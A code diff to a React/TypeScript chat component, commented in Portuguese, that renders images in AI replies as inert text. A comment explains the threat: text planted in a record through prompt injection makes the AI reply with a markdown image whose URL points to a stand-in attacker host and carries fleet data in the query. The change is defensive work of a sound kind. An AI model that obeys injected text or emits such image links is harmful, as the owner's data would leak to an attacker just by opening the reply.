@@ -9,6 +9,25 @@
 // patch em node_modules. O Streamdown então mostra um bloco de código INERTE
 // (nunca o componente Mermaid). Markdown, tabelas, links e código comum seguem.
 
+import { createElement } from "react";
+
+// IMAGEM na resposta da IA NUNCA é carregada. O navegador buscaria a URL
+// SOZINHO (sem clique): um texto malicioso cadastrado num registro (prompt
+// injection) faria a IA responder ![](https://atacante/?d=<dados da frota>) e o
+// dono vazaria os dados só de abrir a resposta. Vira texto inerte "[imagem]".
+// Links (<a>) seguem — exigem clique e já passam pelo safeAiUrl.
+function ImagemInerte(props: { alt?: string }) {
+  const alt = (props.alt ?? "").trim();
+  return createElement(
+    "span",
+    { className: "text-muted-foreground" },
+    alt ? `[imagem: ${alt}]` : "[imagem]"
+  );
+}
+
+// Passado em `components` do Streamdown/react-markdown (AIChatBox e testes).
+export const AI_MARKDOWN_COMPONENTS = { img: ImagemInerte };
+
 // Nó mínimo do mdast que precisamos (evita depender de @types/mdast /
 // unist-util-visit). Só lemos type/lang e descemos por children.
 interface MdastNodeLike {
